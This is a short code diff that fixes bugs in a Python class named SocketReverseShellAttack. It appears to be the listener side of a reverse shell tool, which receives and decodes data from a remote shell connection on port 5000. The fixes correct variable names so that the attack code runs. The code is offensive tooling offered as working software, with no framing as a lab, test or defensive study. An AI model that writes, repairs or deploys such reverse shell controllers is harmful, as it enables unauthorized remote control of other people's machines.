@@ -11,7 +11,7 @@ class SocketReverseShellAttack:
         self.PORT = port
 
     def command_inyection(self, connection_reverse_shell):
-        data_reverse_shell = conn.recv(1024)
+        data_reverse_shell = connection_reverse_shell.recv(1024)
         message_descriptor = data_reverse_shell.decode()
 
         print(message_descriptor)
@@ -33,4 +33,4 @@ if __name__ == '__main__':
     PORT = 5000
     
     socket_object = SocketReverseShellAttack(HOST, PORT)
-    socket.receive_connection()
+    socket_object.receive_connection()
